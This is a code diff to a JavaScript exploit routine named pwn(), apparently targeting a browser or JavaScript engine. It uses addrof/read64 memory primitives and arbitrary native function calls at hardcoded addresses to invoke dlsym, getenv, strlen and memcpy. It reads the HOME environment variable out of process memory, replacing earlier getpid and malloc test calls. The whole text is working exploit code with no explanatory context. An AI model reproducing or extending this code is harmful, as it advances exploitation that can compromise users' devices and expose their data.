@@ -414,6 +414,9 @@ function pwn() {
                 case 'string':
                     value = BigInt(getStringAddress(arg));
                     break;
+                case 'object':
+                    value = BigInt(read64(addrof(arg) + 0x10));
+                    break;
                 default:
                     value = BigInt(arg);
             }
@@ -425,20 +428,27 @@ function pwn() {
         return arrayView.getBigUint64(0x8, true);
     }
     
-    // call strlen
-    alert(`[+] strlen ret = ${arbCall(0x1daf7af20, "exit")}`);
+    function readbuf(addr, size) {
+        let uint8Array = new Uint8Array(size);
+        arbCall(0x1daf7a820, uint8Array, addr, size); // memcpy
+        return uint8Array;
+    }
+    
     
     // call dlsym
-    alert(`[+] dlsym ret = 0x${arbCall(0x18039e2b8, -2, "exit").toString(16)}`);
+    let getenvAddr = arbCall(0x18039e2b8, -2, "getenv");
+    log(`[+] getenv address: 0x${getenvAddr.toString(16)}`);
     
+    let homeStringAddr = arbCall(getenvAddr, "HOME");
+    log(`[+] home string address: 0x${homeStringAddr.toString(16)}`);
     
-    // arbCall(0x4142434445464748n, 0x41n, 0x42n, 0x43n, 0x44n, 0x45n, 0x46n, 0x47n, 0x48n, 0x49n);
+    let homeStringLen = arbCall(0x1daf7af20, homeStringAddr);
+    let homeStringBytes = readbuf(homeStringAddr, Number(homeStringLen));
+    let homeString = new TextDecoder('utf-8').decode(homeStringBytes);
     
-    let pid = arbCall(0x1babf715c); // getpid()
-    log(`[+] pid = ${pid}`);
-    alert(`[+] pid = ${pid}`);
-    
-    let buf = arbCall(0x1918c5280, 10); // malloc(10)
-    log(`[+] buf = 0x${buf.toString(16)}`);
-    alert(`[+] buf = 0x${buf.toString(16)}`);
+    log(`[+] HOME: ${homeString}`);
+}
+
+function logBytes(array) {
+    log(Array.from(array).map(byte => byte.toString(16).padStart(2, '0')).join(' '));
 }
